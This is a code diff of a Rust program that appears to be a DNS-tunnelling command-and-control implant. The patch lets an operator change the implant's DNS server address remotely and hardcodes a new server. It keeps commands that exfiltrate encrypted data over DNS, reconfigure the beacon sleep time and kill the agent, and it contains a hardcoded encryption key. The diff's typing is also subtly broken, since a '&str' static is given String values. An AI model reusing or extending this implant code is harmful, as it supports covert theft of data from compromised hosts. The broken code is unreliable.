@@ -28,7 +28,7 @@ const DOMAINS: [&str; 7] = [
 pub static mut SLEEP: u64 = 5;
 
 //Address of the DNS Server to query
-pub static DNS_SERVER: &str = "172.17.0.3:53";
+pub static mut DNS_SERVER: &str = String::new();
 
 //Encryption key
 pub static ENCRYPTION_KEY: &str = "Ql60hqrp1NhiCzH8XZRaJkUy2mU7COgV";
@@ -36,6 +36,12 @@ pub static ENCRYPTION_KEY: &str = "Ql60hqrp1NhiCzH8XZRaJkUy2mU7COgV";
 
 
 fn main() {
+
+    //Initial value
+    unsafe {
+        DNS_SERVER = "192.168.1.16:53".to_string();
+    }
+
 
     let mut rng = rand::thread_rng();
 
@@ -51,6 +57,13 @@ fn main() {
                             crypto::encrypt("Sleep reconfigured".to_string().as_bytes()).unwrap(), 
                             domain
                     );
+            continue;
+        } else if cmd.starts_with("reconfigure_dnsaddr") {
+            let _ = utils::exfiltrate_data(
+                            crypto::encrypt("DNS server addr reconfigured".to_string().as_bytes()).unwrap(), 
+                            domain
+                    );
+            utils::reconfigure_dnsserver(cmd);
             continue;
         } else if cmd == "kill_agent" {
             let _ = utils::exfiltrate_data(
